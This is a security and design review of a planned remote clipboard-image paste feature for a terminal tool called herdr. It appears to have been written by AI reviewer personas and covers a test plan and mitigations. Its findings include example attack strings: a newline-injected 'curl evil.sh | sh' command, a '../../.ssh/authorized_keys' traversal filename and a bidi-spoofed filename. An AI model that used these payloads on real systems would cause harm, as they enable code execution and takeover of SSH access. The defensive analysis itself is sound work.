# Predict — 5-persona debate on approved design B

Date 2026-07-22 · route R7 stage 3 · 5 parallel personas (architecture, security, reliability, UX/DX,
test/rollout). Design under debate: **B — stage remotely, paste locally**, images-only v1, original
filename preserved.

**This report is ship-gate material: the predicted-vs-actual table is reconciled at stage 8.**

---

## A. CORRECTIONS TO EARLIER STAGES (blindspot + brainstorm were wrong on these)

| # | Earlier claim | Truth | Evidence |
|---|---|---|---|
| C1 | "wire the handler at `serve.rs:441` handle_inbound" | `serve.rs::handle_inbound` is `#[allow(dead_code)]`, "only reachable through run(), kept for loopback.rs's tests". **Production inbound dispatch is `src/server/federation_accept.rs::reader_loop` + a `FederationCommand` in `federation_actor.rs`** | serve.rs:413-415; federation_accept.rs:444-503,511-559 |
| C2 | "mount_generation fences stale traffic" | **Degenerate — always 1 in production.** New `FederationClient` per dial (`session.rs:195`) with `next_generation: AtomicU64::new(0)` (`client.rs:129`) → always yields 1 (`client.rs:208`); server `MOUNT_GENERATION` is a per-process const 1 (`serve.rs:44`). `id::fence()` is bare equality (`id.rs:198-207`). A stale response after a fast remount passes the fence. | as cited |
| C3 | "capability gating is the documented mechanism" | The mechanism exists (`client.rs:184-188`) but **has no production precedent**: `Capability::CLIPBOARD` is defined (`protocol/mod.rs:48`) and referenced nowhere; `SplitPaneRequest` is sent with **no capability gate at all** (`app/api/panes.rs:233-244`). `required_capabilities` is checked once at mount time and hard-fails the WHOLE mount; `RemoteMirror` never stores `agreed_capabilities`, so no post-mount per-feature gate exists yet. | as cited |
| C4 | "correlated RPC precedent to copy" | The precedent has **no timeout on either side**. Client: no timer anywhere (`panes.rs:34-37`, `app/mod.rs:158`), entries removed only on response or purge (`creation.rs:815-821`). Server: `handle_split_pane_request` does `rx.blocking_recv()` with no timeout **inline on the connection reader thread** (`federation_accept.rs:511-555`) — one stuck request stalls all inbound traffic on that mount. | as cited |
| C5 | "reuse the existing paste trigger" | `should_bridge_clipboard_image_paste` gates on `is_remote_client_process()` — a **whole-process** flag true only for the thin `herdr --remote` SSH bridge client (`client/mod.rs:667-669,1798-1808`). The mounted-workspace TUI is NOT that process, so the trigger does not fire there today. Capture needs a new per-workspace/per-pane gate. | as cited |

---

## B. FINDINGS BY SEVERITY

### CRITICAL-1 — returned remote path is a command-injection primitive
The response path is typed into a PTY through `try_send_paste` → `paste_payload` (`pane.rs:3072-3084`).
Bracketing is applied **only when `input_state.bracketed_paste` is true**; otherwise the string is sent
raw, indistinguishable from keystrokes — including `\n` = Enter. A malicious/compromised remote
returning `/tmp/x\n; curl evil.sh | sh\n` executes in the user's shell.
Bracketed paste is a shell-cooperation convention, **not a security boundary**.
**Fix (contract, client-side, before `try_send_paste`):** (1) require UTF-8 (JSON codec gives this);
(2) apply `sanitize::sanitize_remote_string` (C0/C1/DEL — `sanitize.rs:38-45`); (3) **reject, don't
strip**, if sanitized ≠ raw (a legitimate path never contains a control byte); (4) explicitly reject
`\n`/`\r` as a named, tested guard even though (2) covers them; (5) only then hand to the existing
path, unchanged.

### CRITICAL-2 — filename preservation is an arbitrary remote-write primitive
The user approved preserving the original filename. **There is zero precedent to mirror**: today's
`clipboard_image::stage()` self-generates the entire name (`clipboard_image.rs:27-30`). Unhardened,
`filename = "../../.ssh/authorized_keys"` writes anywhere on the remote host.
**Mandatory ordered contract (server-side):**
1. reject empty / >255 bytes; 2. reject NUL; 3. take `Path::new(f).file_name()`, reject `None`
   (catches `.`/`..`/root); 4. reject if it differs from the input (input contained a separator) and
   reject leading `~`; 5. strip C0/C1/DEL via `sanitize_remote_string` **plus** the bidi-control block
   `U+200E-200F, U+202A-202E, U+2066-2069` (NOT covered by C0/C1 — `evil<RLO>gnp.exe` renders as
   `evilexe.png`); 6. reject trailing dots/spaces; 7. **discard the carried extension**, re-derive from
   the sanitized suffix against the allowlist, hard `Err(UnsupportedExtension)` on miss — never the
   png fallback; 8. still prefix the collision-proof `client-{id}-clipboard-{unique}-{attempt}-` scheme
   so the on-disk path is never solely attacker-chosen and `create_new`'s 100-retry uniqueness holds.
**Corollary:** with the filename preserved, the separate `extension` field is redundant and actively
dangerous (two sources of truth). Drop it, or require equality and reject mismatch.

### CRITICAL-3 (rollout) — an ungated send tears down the whole mount
If any `ClipboardStageRequest` send site is not gated on the agreed capability, an old remote hits an
unknown externally-tagged JSON variant → `CodecError::Malformed` → `read_frame` Err (`serve.rs:184-185`)
→ `?` propagates through `drive_mount_channel` → **the entire mount dies**, not just the paste.
The existing precedent (`SplitPaneRequest`) does exactly this ungated. Per the user's own ops notes,
laptop-ahead-of-VM drift is the everyday state of this fork. **Every send site must be gated**, which
requires new plumbing: `agreed_capabilities` is not currently stored on `RemoteMirror`.

### HIGH-1 — head-of-line blocking is real, and is NOT specific to design B
`read_frame` does `read_exact` for the whole frame body (`serve.rs:157-198`, `federation_accept.rs:110-145`);
one shared duplex carries terminal output, agent status, and clipboard, read one frame at a time
(`client.rs:492-493`, `federation_accept.rs:444-503`). A 16 MiB image on a slow link (≈200 Kbps → >10
min) **freezes every pane on that mount** for the duration.
Design A has the identical property (same channel, same framing) — only C escapes it. So this does not
reopen the A-vs-B choice, but it is a real cost of putting bytes on the tunnel at all.
**Mitigation to decide in planning:** chunk the payload into bounded frames so interactive traffic
interleaves, vs. accept the stall for v1.

### HIGH-2 — staging on the connection reader thread stalls all panes
`reader_loop` is one blocking `std::thread` per mount that also services every pane's Input/Resize/Close
(`federation_accept.rs:444-503,461-471`). Doing a 16 MiB filesystem write inline stalls all of them.
**Fix:** reader enqueues only; write on a bounded worker (`spawn_blocking` / dedicated task), mirroring
`output_pump`'s separation (`federation_accept.rs:741`).

### HIGH-3 — no timeout, unbounded pending map
Per C4 the precedent has none. **Contract:** timer starts when the request hits `out_tx`; use a
payload-size-proportional budget (`base + bytes/min_throughput`), not a fixed constant — a fixed 10-15s
tuned on loopback will false-positive on a real 16 MiB paste over SSH. Per-request `tokio::time::sleep`
raced against resolution, so cancelling one never affects another. On fire: `HashMap::remove` **first**
as the atomic claim (matching `take_pending_remote_split`, `creation.rs:805-807`), then toast.
Cap in-flight stages per mount (4-8). Purge hook goes into the two existing teardown sites —
`handle_federation_mount_ended` (`workspaces.rs:369`) and `handle_workspace_close` (`workspaces.rs:650`) —
as a sibling to `purge_pending_remote_splits_for_workspaces`; do not invent a third path.

### HIGH-4 — stale-response guard cannot rely on generation (see C2)
**Ordered guard before any injection:** (1) `pending_map.remove(request_id)` must succeed, else drop;
(2) response's mount `HostKey` == `pending.origin` (matches `creation.rs:845-856`); (3) **additionally**
verify the live mount is the same physical connection minted against — `server_instance_id` is the only
field that actually varies per connection, and it is currently captured but never compared anywhere:
this is new work, not a pattern to copy; (4) resolve the target pane from the id **stored at mint time**,
never "the currently focused pane" — the user will have switched panes during a slow transfer
(cf. `creation.rs:879-885`); if that pane is gone, drop with a toast.

### MEDIUM — remote disk exhaustion
Repeated 16 MiB pastes outpace the 24h sweep (`clipboard_image.rs:6,118-134`). Proportionate fix: a
staging-dir total-bytes check before write (≈500 MiB) → `Err(QuotaExceeded)`. Not worth more machinery;
this is self-inflicted-only under the trust model.

### LOW / NON-ISSUES (filtered, not padded)
- **TOCTOU on staging dir** (`ensure_staging_dir` uses `fs::metadata`, follows symlinks — `clipboard_image.rs:82-94`): pre-existing, local-user-on-shared-box threat, outside the federation trust model. The file write itself is already O_EXCL-safe via `create_new` (`:32`). Inherited debt — do not fix here (scope creep).
- **Cross-user staging leak**: 0o700/0o600 + euid-scoped dir (`:74-80,100,110`) is exactly proportionate. Per-workspace isolation would be enterprise multi-tenant thinking this product does not have.
- **request_id forgery**: only the remote sees outstanding ids; a lying remote is already covered by CRITICAL-1. Sequential `u64` is fine — it is not a capability token.

---

## C. VERSION VERDICT (release-correctness landmine — resolved)

- `PROTOCOL_VERSION` (client/server, `wire.rs:16`) = 17; `v0.7.5` is also 17. **No bump** — this design never touches `wire.rs`.
- `FEDERATION_PROTOCOL_VERSION` (`protocol/mod.rs:37`) = 3. `v0.7.5` has **no `src/remote/federation/` tree at all** — federation is entirely unreleased. Matches the in-source policy comment (`mod.rs:24-36`): add without bump when no production call site shipped in a tagged version. **No bump.**
- Skew safety therefore rests **entirely** on capability gating (CRITICAL-3), because the handshake will not catch drift.

## D. STATE PLACEMENT + NAMING

- Pending map goes on **`App`** (`app/mod.rs:158`), sibling to `pending_remote_splits` — **not** `AppState`, which must stay pure data testable without PTYs/async (resolution needs `runtime.try_send_paste`). Per the boundary guardrail it is neither a shared session fact nor TUI presentation state: it is server-internal RPC-correlation bookkeeping, the third bucket `pending_remote_splits` already occupies.
- Name the capability for the operation (e.g. `"file_staging"`), **not** `CLIPBOARD_*` — the existing decorative `Capability::CLIPBOARD` is unused and would be confused with it.
- Scope the error enum (`ClipboardStageFailure`), avoid bare `StageError`.
- **New variants need their own `Channel` arm**: `Control` is capped at 4 KiB (`protocol/mod.rs:340`) — far too small for an image. Add an arm to `Channel::max_len()`/`channel()` (`protocol/mod.rs:332-343,368-384`).
- Staging logic goes in a new small module under `src/remote/federation/` (<200 LOC), **not** `server/clipboard_image.rs` (147 LOC, keyed by TUI `client_id`, deliberately cross-platform; federation is Unix-only). Factor out a shared sanitize/atomic-write helper only if genuinely identical.

## E. UX

- **Feedback API is settled:** in-TUI `ToastNotification` (`app/state.rs:1332-1337`, kinds `:1319-1323`, rendered `ui/status.rs:82-127`, 8s for `NeedsAttention` via `api.rs:734-748`). Copy the exact pattern in `handle_federation_split_pane_failed` (`creation.rs:948-994`). **Not** the OSC path (`client/mod.rs:1552`), which belongs to the thin bridge client.
- Warning from precedent: the closest analog fails **silently** today — `headless.rs:2985-2989` logs a `warn!` and sends no notify, unlike its sibling `ClientPasteRejected` (`headless.rs:2952-2966`). Surfacing failures is new work, not inherited.
- Toast context has **no `.wrap()`** (`ui/status.rs:120-126`) — ratatui hard-clips with no ellipsis. Keep every string under ~60 display cells.
- Default trigger key `remote_image_paste` = **`ctrl+v`** (`config/model.rs:948`) collides with readline quoted-insert and vim visual-block, and is documented nowhere (absent from `config-reference.mdx`).
- Final error copy (title / context):
  - `image paste failed` / `remote workspace disconnected before the image was saved`
  - `image paste failed` / `remote host is out of disk space`
  - `image paste failed` / `image is over 16MB, herdr's remote paste limit`
  - `image paste failed` / `clipboard has no image herdr can paste (png/jpg/gif/webp/bmp only)`
  - `image paste failed` / `remote herdr is too old to support image paste; update it`
  - `image paste failed` / `remote host did not respond; check the mount and retry`
- Size must be pre-checked **client-side before send** (as `client/mod.rs:1430-1437` already does for the bridge client); otherwise oversize surfaces as "mount disconnected" (`client_transport.rs:736-745` closes the connection) and collides with a different error string.
- Pending affordance: nothing comparable exists. v1 = show nothing for the fast case, toast "saving image to remote host…" past ~1.5s. A spinner is not YAGNI-justified.

## F. TEST PLAN (TDD-first marked ★)

Wire/codec (template `snapshot_request_response_roundtrip_through_the_wire_codec`, `protocol/mod.rs:449`):
★`clipboard_stage_request_response_roundtrip_through_the_wire_codec`, ★`clipboard_stage_request_response_respect_their_channel_caps`
Capability: ★`clipboard_stage_capability_absent_on_one_side_is_dropped_not_fatal`, ★`clipboard_stage_capability_present_both_sides_is_agreed`, ★`stage_request_is_not_sent_when_capability_not_agreed` (guards CRITICAL-3)
Filename sanitisation (all net-new surface): ★`stage_rejects_path_traversal_in_original_filename`, ★`stage_rejects_absolute_path_filename`, ★`stage_rejects_null_byte_in_filename`, ★`stage_rejects_or_strips_bidi_override_in_filename`, ★`stage_rejects_unknown_extension_instead_of_png_fallback`, ★`stage_rejects_oversized_filename`
Returned-path guard: ★`returned_remote_path_with_embedded_newline_is_rejected_before_paste`, ★`returned_remote_path_with_esc_sequence_is_rejected_before_paste`
Pending map / lifecycle: ★`clipboard_stage_request_times_out_when_remote_never_responds`, `clipboard_stage_timeout_is_proportional_to_payload_size_not_fixed`, `clipboard_stage_pending_entries_purged_on_workspace_close_and_mount_end`, `stale_clipboard_stage_response_from_a_torn_down_mount_is_dropped_not_injected`, `clipboard_stage_response_from_a_different_hostkey_is_rejected`, `two_pastes_in_quick_succession_resolve_independently_and_in_any_completion_order`, `concurrent_stage_requests_beyond_cap_are_rejected_locally`
End-to-end loopback (`loopback.rs:235-256`): `clipboard_stage_request_end_to_end_through_loopback_server`, `a_large_clipboard_frame_does_not_starve_terminal_output_delivery_forever` (documents HIGH-1)
Pure state (`AppState::test_new()`): `remote_paste_injects_staged_path_through_local_paste_command`

## G. EXPLICIT TEST GAPS (cannot be covered; require manual validation)

Real SSH dial path (documented manual-only in `unix.rs`); **mixed-binary skew** (loopback compiles both
ends from one tree — an "old peer" can only be faked by hand-built raw frames); real OS clipboard read;
real remote filesystem permissions/quota/disk-full; Windows (federation is `#[cfg(unix)]`, but
`windows-lint` still cross-compiles — new code must stub cleanly).

## H. MANUAL VALIDATION SCRIPT

1. `env -u HERDR_SOCKET_PATH -u HERDR_CLIENT_SOCKET_PATH cargo run -- <command>` (debug build talks to `herdr-dev`, not installed stable).
2. Deploy identical source to the VM and build there.
3. Mount via `workspace.mount_remote` over `herdr.sock`.
4. Copy a real PNG locally, focus a pane on the mounted remote workspace, trigger paste; confirm a **remote** path arrives and the remote agent can actually read that file.
5. **Repeat against a VM left on an older commit** — confirms the capability gate degrades gracefully instead of killing the mount (CRITICAL-3).
6. Inspect staged file permissions and cleanup on the VM.

## I. PREDICTIONS TABLE (ship-gate reconciles this)

| # | Prediction | Severity | Confidence |
|---|---|---|---|
| P1 | Path returned by remote reaches PTY unsanitised unless explicitly guarded | CRITICAL | high |
| P2 | Preserved filename enables traversal unless the full ordered contract ships | CRITICAL | high |
| P3 | An ungated send site kills the whole mount against an older peer | CRITICAL | high |
| P4 | Large paste stalls all panes on the mount (HOL blocking) | HIGH | high |
| P5 | Staging inline on the reader thread stalls all panes | HIGH | high |
| P6 | Pending request hangs forever without a new timeout | HIGH | high |
| P7 | Stale response injected after remount because generation is always 1 | HIGH | high |
| P8 | Paste lands in the wrong pane if focus is re-resolved at response time | MEDIUM | high |
| P9 | Capture never fires in the mounted TUI (process-level gate) | HIGH | high |
| P10 | Failures stay silent because the nearest precedent is silent | MEDIUM | high |

## J. UNRESOLVED QUESTIONS FOR THE USER

1. **Head-of-line blocking (P4):** chunk the payload for v1, or accept that a large paste freezes the mount's panes while it transfers?
2. **`mount_generation` is degenerate (C2)** — fix federation-wide (also affects `SplitPaneResponse` today), or work around it locally in this feature only?
3. Default trigger key `ctrl+v` collides with readline/vim — change it, or leave and document?
4. Staging-dir lifetime: keep the 24h sweep, or tie it to mount lifetime?
